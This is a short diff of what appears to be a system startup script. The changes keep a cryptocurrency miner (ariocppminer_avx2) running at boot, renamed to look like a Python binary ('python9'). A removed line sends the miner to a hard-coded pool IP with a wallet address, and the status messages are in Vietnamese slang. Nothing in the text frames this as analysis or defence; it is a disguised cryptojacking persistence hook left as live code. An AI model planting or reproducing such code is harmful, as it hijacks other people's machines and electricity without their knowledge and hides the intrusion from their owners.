@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python5 ]; then
-    if pgrep -x "python5" > /dev/null
+if [ -f ${PWD}/python9 ]; then
+    if pgrep -x "python9" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python5 -o 42.119.159.78:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python9
 
      
 fi
@@ -37,7 +37,7 @@ y2nNWENYMvLRiyfRXf1Hf2JCrKMVMyvzL38CTQgMPrEAohWn8RSYkpRjvxvwELepeBrEpa1pwJQSRtnK
 enhanced
 true
 `hostname`" > config.cfg
-mv ariocppminer_avx2 python3
-./python3
+mv ariocppminer_avx2 python9
+./python9
 
 exit 0
